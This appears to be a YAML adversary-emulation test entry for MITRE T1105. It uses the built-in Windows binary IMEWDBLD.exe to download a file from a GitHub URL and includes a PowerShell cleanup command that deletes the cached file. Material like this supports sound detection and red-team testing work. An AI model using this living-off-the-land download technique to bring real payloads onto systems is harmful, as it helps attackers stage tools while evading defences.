- requirements: []
  name: Soumaia ART Tests - Download a file with IMEWDBLD.exe
  description: 'Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file.

    Downloaded files can be found in "%LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>" or `%LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>.

    Run "Get-ChildItem -Path C:\Users\<USERNAME>\AppData\Local\Microsoft\Windows\INetCache\ -Include <FILENAME>* -Recurse -Force -File -ErrorAction SilentlyContinue" without quotes and adding the correct username and file name to locate the file.'
  tactic: command-and-control
  technique_id: T1105
  technique_name: Ingress Tool Transfer
  executors:
  - cleanup:
    - $inetcache = $env:LOCALAPPDATA + "\Microsoft\Windows\INetCache\"; $file_to_be_removed = [string[]] (Get-ChildItem -Path $inetcache -Include T1105* -Recurse -Force -File -ErrorAction SilentlyContinue); if("" -ne "$file_to_be_removed") { Remove-Item "$file_to_be_removed" -ErrorAction Ignore }
    timeout: 60
    platform: windows
    name: psh
    payloads: []
    parsers: []
    command: $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe"; & $imewdbled https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml
  id: 1c97cd67-23bd-5c77-afb9-b0cb06ce248f
